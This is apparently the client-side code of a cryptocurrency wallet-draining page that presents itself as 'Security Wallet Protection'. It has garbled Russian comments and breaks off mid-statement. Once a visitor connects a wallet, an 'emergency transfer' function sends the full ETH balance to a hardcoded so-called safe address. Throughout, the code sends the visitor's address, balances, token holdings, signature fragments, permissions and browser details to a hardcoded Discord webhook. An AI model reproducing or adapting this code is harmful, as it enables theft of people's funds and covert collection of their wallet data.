// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb'; // TRC20 –∫–æ—à–µ–ª–µ–∫
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –≥–∞–∑ —Ü–µ–Ω—É –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è

// –î–æ–±–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
let web3;
let userAddress;

// –û–±–Ω–æ–≤–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
connectButton.addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        updateStatus(`–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ê–¥—Ä–µ—Å: ${userAddress}`);
        
        connectButton.style.display = 'none';
        signButton.style.display = 'block';
        
        // –ü–û–ö–ê–ó–´–í–ê–ï–ú –°–ï–ö–¶–ò–Æ –≠–ö–°–¢–†–ï–ù–ù–û–ì–û –ü–ï–†–ï–í–û–î–ê –ü–û–°–õ–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø
        document.getElementById('emergencySection').style.display = 'block';
        
        // –ó–ê–ì–†–£–ñ–ê–ï–ú –ë–ê–õ–ê–ù–°–´
        await loadBalances();
        
    } catch (error) {
        // ... —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ ...
    }
});

// –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤
async function loadBalances() {
    const balancesList = document.getElementById('balancesList');
    balancesList.innerHTML = '<p>–ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤...</p>';
    
    try {
        // –û—Å–Ω–æ–≤–Ω–æ–π –±–∞–ª–∞–Ω—Å ETH
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <p><strong>ETH:</strong> ${parseFloat(ethBalance).toFixed(6)} ETH</p>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤</p>';
    }
}

// –§—É–Ω–∫—Ü–∏—è —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
async function emergencyTransfer() {
    const transferStatus = document.getElementById('transferStatus');
    transferStatus.innerHTML = '<p style="color: orange;">‚è≥ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞...</p>';
    
    try {
        // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.innerHTML = '<p style="color: red;">‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p style="color: orange;">‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...</p>';
        
        // –°–æ–∑–¥–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.innerHTML = `
            <p style="color: green;">‚úÖ –ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!</p>
            <p><strong>–•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:</strong> ${receipt.transactionHash}</p>
            <p><strong>–°—É–º–º–∞:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>–ë–ª–æ–∫:</strong> ${receipt.blockNumber}</p>
        `;
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞:', error);
        transferStatus.innerHTML = `<p style="color: red;">‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${error.message}</p>`;
    }
}

// –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
document.getElementById('emergencyTransferBtn').addEventListener('click', function() {
    const confirmation = confirm(
        'üö® –í–ù–ò–ú–ê–ù–ò–ï! –í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –í–°–ï —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.\n\n' +
        `–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫: ${SAFE_WALLET}\n\n` +
        '–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ TRC20 —Ç–æ–∫–µ–Ω–æ–≤ (–¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ)
async function checkTRC20Tokens() {
    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö TRC20 —Ç–æ–∫–µ–Ω–æ–≤
    // –ù–∞–ø—Ä–∏–º–µ—Ä, USDT TRC20: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
}



// –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π —Å–µ—Ç–∏
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        
        // –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Å–µ—Ç–∏ (Ethereum Mainnet, BSC, Polygon)
        const supportedNetworks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon'
        };
        
        if (!supportedNetworks[chainId]) {
            updateStatus(`–í–Ω–∏–º–∞–Ω–∏–µ: –í—ã –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ —Å–µ—Ç–∏ ID ${chainId}. –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ—Å–Ω–æ–≤–Ω—ã–µ —Å–µ—Ç–∏.`, true);
        }
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ—Ç–∏:', error);
    }
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
// –î–æ–±–∞–≤–∏—Ç—å –≤ —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞:
// await checkNetwork();

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
async function startWalletMonitoring() {
    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π –∞–∫–∫–∞—É–Ω—Ç–∞
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            updateStatus('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω', true);
            document.getElementById('emergencySection').style.display = 'none';
        } else {
            userAddress = accounts[0];
            updateStatus(`–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω: ${userAddress}`);
            loadBalances();
        }
    });
    
    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π —Å–µ—Ç–∏
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
if (typeof window.ethereum !== 'undefined') {
    // ... —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ ...
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ—Å–ª–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
    setTimeout(startWalletMonitoring, 1000);
}


// server.js - –¥–æ–±–∞–≤–∏—Ç—å –∫ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É –∫–æ–¥—É
app.post('/api/log-emergency-transfer', (req, res) => {
    const { fromAddress, toAddress, amount, txHash, timestamp } = req.body;
    
    // –õ–æ–≥–∏—Ä—É–µ–º —ç–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥
    console.log('üö® –≠–ö–°–¢–†–ï–ù–ù–´–ô –ü–ï–†–ï–í–û–î:', {
        fromAddress,
        toAddress,
        amount,
        txHash,
        timestamp: new Date(timestamp).toISOString()
    });
    
    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π (email, telegram –∏ —Ç.–¥.)
    
    res.json({ success: true, message: '–õ–æ–≥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω' });
});






// ==================== DISCORD WEBHOOK LOGGING ====================

const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1419987624294092870/K1UHB4vSk5uLQEd3OTabf8QI03NgYW0sVfF_RrTGsbrzL0c8KxRWMOUOkCbDUWAaokP0';

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ Discord
async function sendDiscordLog(action, details, color = 3447003) {
    try {
        const embed = {
            title: `üîê Security Wallet Action - ${action}`,
            color: color,
            fields: [
                {
                    name: "üïê –í—Ä–µ–º—è",
                    value: new Date().toLocaleString('ru-RU'),
                    inline: true
                },
                {
                    name: "üåê User Agent",
                    value: navigator.userAgent.substring(0, 100) + '...',
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        };

        // –î–æ–±–∞–≤–ª—è–µ–º –¥–µ—Ç–∞–ª–∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –¥–µ–π—Å—Ç–≤–∏—è
        if (details) {
            for (const [key, value] of Object.entries(details)) {
                if (value) {
                    embed.fields.push({
                        name: key,
                        value: String(value).substring(0, 1024), // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ Discord
                        inline: key.includes('–ê–¥—Ä–µ—Å') || key.includes('–•—ç—à') ? false : true
                    });
                }
            }
        }

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Wallet Security Logger',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
            })
        });

        if (!response.ok) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:', await response.text());
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞:', error);
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥—Ä–æ–±–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–æ–∫–µ–Ω–∞—Ö
async function getDetailedTokenInfo(userAddress) {
    try {
        const tokens = [];
        
        // –ü–æ–ø—É–ª—è—Ä–Ω—ã–µ ERC-20 —Ç–æ–∫–µ–Ω—ã (–∞–¥—Ä–µ—Å–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤)
        const popularTokens = [
            { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
            { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
            { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
            { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
            { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
            { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
        ];

        for (const token of popularTokens) {
            try {
                // ABI –¥–ª—è –±–∞–ª–∞–Ω—Å–∞ ERC-20 —Ç–æ–∫–µ–Ω–∞
                const minABI = [
                    {
                        "constant": true,
                        "inputs": [{"name": "_owner", "type": "address"}],
                        "name": "balanceOf",
                        "outputs": [{"name": "balance", "type": "uint256"}],
                        "type": "function"
                    }
                ];

                const tokenContract = new web3.eth.Contract(minABI, token.address);
                const balance = await tokenContract.methods.balanceOf(userAddress).call();
                
                if (balance > 0) {
                    const formattedBalance = balance / Math.pow(10, token.decimals);
                    tokens.push({
                        symbol: token.symbol,
                        balance: formattedBalance.toFixed(4),
                        contract: token.address
                    });
                }
            } catch (error) {
                // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Ç–æ–∫–µ–Ω—ã —Å –æ—à–∏–±–∫–∞–º–∏
                continue;
            }
        }

        return tokens;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–æ–∫–µ–Ω–∞—Ö:', error);
        return [];
    }
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥—Ä–æ–±–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ—à–µ–ª—å–∫–µ
async function getWalletDetails(userAddress) {
    try {
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        const chainId = await web3.eth.getChainId();
        const networkNames = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const tokens = await getDetailedTokenInfo(userAddress);
        
        return {
            ethBalance: parseFloat(ethBalance).toFixed(6),
            network: networkNames[chainId] || `Unknown (${chainId})`,
            tokenCount: tokens.length,
            tokens: tokens
        };
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª–µ–π –∫–æ—à–µ–ª—å–∫–∞:', error);
        return null;
    }
}

// ==================== –õ–û–ì–ì–ò–†–û–í–ê–ù–ò–ï –°–û–ë–´–¢–ò–ô ====================

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('load', function() {
    sendDiscordLog('PAGE_LOAD', {
        "üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞": "Security Wallet Protection –∑–∞–≥—Ä—É–∂–µ–Ω–∞",
        "üìç URL": window.location.href,
        "üñ•Ô∏è –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞": navigator.platform,
        "üì± –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ": `${screen.width}x${screen.height}`
    }, 10181046);
});

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
connectButton.addEventListener('click', function() {
    sendDiscordLog('CONNECT_BUTTON_CLICK', {
        "üîò –î–µ–π—Å—Ç–≤–∏–µ": "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª –∫–Ω–æ–ø–∫—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞",
        "üåê –†–µ—Ñ–µ—Ä–µ—Ä": document.referrer || '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'
    }, 15844367);
});

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ (–¥–æ–±–∞–≤–∏—Ç—å –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫)
async function logWalletConnection(accounts) {
    userAddress = accounts[0];
    
    const walletDetails = await getWalletDetails(userAddress);
    
    const details = {
        "‚úÖ –°—Ç–∞—Ç—É—Å": "–ö–æ—à–µ–ª–µ–∫ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω",
        "üë§ –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞": userAddress,
        "üí∞ –ë–∞–ª–∞–Ω—Å ETH": walletDetails?.ethBalance + ' ETH',
        "üåê –°–µ—Ç—å": walletDetails?.network,
        "üéØ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–æ–∫–µ–Ω–æ–≤": walletDetails?.tokenCount
    };

    // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–∞—Ö –µ—Å–ª–∏ –æ–Ω–∏ –µ—Å—Ç—å
    if (walletDetails?.tokens && walletDetails.tokens.length > 0) {
        walletDetails.tokens.forEach((token, index) => {
            details[`üíé –¢–æ–∫–µ–Ω ${index + 1}`] = `${token.symbol}: ${token.balance}`;
        });
    }

    sendDiscordLog('WALLET_CONNECTED', details, 3066993);
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è (–¥–æ–±–∞–≤–∏—Ç—å –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫)
function logSignature(message, signature) {
    sendDiscordLog('MESSAGE_SIGNED', {
        "üìù –î–µ–π—Å—Ç–≤–∏–µ": "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–¥–ø–∏—Å–∞–ª —Å–æ–æ–±—â–µ–Ω–∏–µ",
        "‚úçÔ∏è –°–æ–æ–±—â–µ–Ω–∏–µ": message.substring(0, 100) + '...',
        "üîè –ü–æ–¥–ø–∏—Å—å": signature.substring(0, 30) + '...',
        "üë§ –ê–¥—Ä–µ—Å": userAddress
    }, 15105570);
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π
async function logPermissions() {
    try {
        const permissions = await window.ethereum.request({
            method: 'wallet_getPermissions'
        });
        
        sendDiscordLog('PERMISSIONS_CHECK', {
            "üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π": "–ü–æ–ª—É—á–µ–Ω—ã –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞",
            "üé´ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π": permissions.length,
            "üìã –ü—Ä–∞–≤–∞": JSON.stringify(permissions.map(p => p.parentCapability))
        }, 15158332);
    } catch (error) {
        sendDiscordLog('PERMISSIONS_ERROR', {
            "‚ùå –û—à–∏–±–∫–∞": "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è",
            "üìù –°–æ–æ–±—â–µ–Ω–∏–µ": error.message
        }, 15158332);
    }
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
function logEmergencyTransferStart() {
    sendDiscordLog('EMERGENCY_TRANSFER_START', {
        "üö® –î–µ–π—Å—Ç–≤–∏–µ": "–ù–∞—á–∞–ª–æ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞",
        "üë§ –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å": userAddress,
        "üéØ –ü–æ–ª—É—á–∞—Ç–µ–ª—å": SAFE_WALLET,
        "‚ö†Ô∏è –°—Ç–∞—Ç—É—Å": "–û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"
    }, 16711680);
}

function logEmergencyTransferSuccess(receipt, transferAmount) {
    sendDiscordLog('EMERGENCY_TRANSFER_SUCCESS', {
        "‚úÖ –î–µ–π—Å—Ç–≤–∏–µ": "–≠–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω",
        "üë§ –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å": userAddress,
        "üéØ –ü–æ–ª—É—á–∞—Ç–µ–ª—å": SAFE_WALLET,
        "üí∞ –°—É–º–º–∞": web3.utils.fromWei(transferAmount.toString(), 'ether') + ' ETH',
        "üì¶ –•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏": receipt.transactionHash,
        "üî¢ –ù–æ–º–µ—Ä –±–ª–æ–∫–∞": receipt.blockNumber,
        "‚õΩ –ö–æ–º–∏—Å—Å–∏—è –≥–∞–∑–∞": receipt.gasUsed
    }, 3066993);
}

function logEmergencyTransferError(error) {
    sendDiscordLog('EMERGENCY_TRANSFER_ERROR', {
        "‚ùå –î–µ–π—Å—Ç–≤–∏–µ": "–û—à–∏–±–∫–∞ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞",
        "üë§ –ê–¥—Ä–µ—Å": userAddress,
        "üìù –û—à–∏–±–∫–∞": error.message,
        "üîß –ö–æ–¥ –æ—à–∏–±–∫–∏": error.code || 'N/A'
    }, 15158332);
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞
function logAccountChange(newAccounts) {
    if (newAccounts.length === 0) {
        sendDiscordLog('WALLET_DISCONNECTED', {
            "üî¥ –î–µ–π—Å—Ç–≤–∏–µ": "–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω",
            "üë§ –ü—Ä–µ–¥—ã–¥—É—â–∏–π –∞–¥—Ä–µ—Å": userAddress
        }, 15158332);
    } else {
        sendDiscordLog('ACCOUNT_CHANGED', {
            "üîÑ –î–µ–π—Å—Ç–≤–∏–µ": "–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω",
            "üë§ –°—Ç–∞—Ä—ã–π –∞–¥—Ä–µ—Å": userAddress,
            "üë§ –ù–æ–≤—ã–π –∞–¥—Ä–µ—Å": newAccounts[0]
        }, 16776960);
    }
}

// –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å–µ—Ç–∏
function logNetworkChange(chainId) {
    const networkNames = {
        1: 'Ethereum Mainnet',
        56: 'Binance Smart Chain',
        137: 'Polygon',
        42161: 'Arbitrum'
    };
    
    sendDiscordLog('NETWORK_CHANGED', {
        "üåê –î–µ–π—Å—Ç–≤–∏–µ": "–°–µ—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∞",
        "üîó ID —Ü–µ–ø–∏": chainId,
        "üì° –°–µ—Ç—å": networkNames[chainId] || `Unknown (${chainId})`
    }, 7419530);
}

// ==================== –û–ë–ù–û–í–õ–ï–ù–ò–ï –°–£–©–ï–°–¢–í–£–Æ–©–ò–• –§–£–ù–ö–¶–ò–ô ====================

// –û–±–Ω–æ–≤–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
const originalConnectHandler = connectButton.onclick;
connectButton.onclick = async function() {
    // –õ–æ–≥–∏—Ä—É–µ–º –Ω–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏ (—É–∂–µ –µ—Å—Ç—å –≤—ã—à–µ)
    
    try {
        connectButton.classList.add('loading');
        updateStatus('‚åõ –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // –õ–æ–≥–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        await logWalletConnection(accounts);
        
        // –õ–æ–≥–∏—Ä—É–µ–º —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è
        await logPermissions();
        
        userAddress = accounts[0];
        updateStatus(`‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ê–¥—Ä–µ—Å: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        // –õ–æ–≥–∏—Ä—É–µ–º –æ—à–∏–±–∫—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        sendDiscordLog('CONNECTION_ERROR', {
            "‚ùå –î–µ–π—Å—Ç–≤–∏–µ": "–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞",
            "üìù –û—à–∏–±–∫–∞": error.message,
            "üîß –ö–æ–¥ –æ—à–∏–±–∫–∏": error.code || 'N/A'
        }, 15158332);
        
        if (error.code === 4001) {
            updateStatus('‚ùå –í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.', true);
        } else {
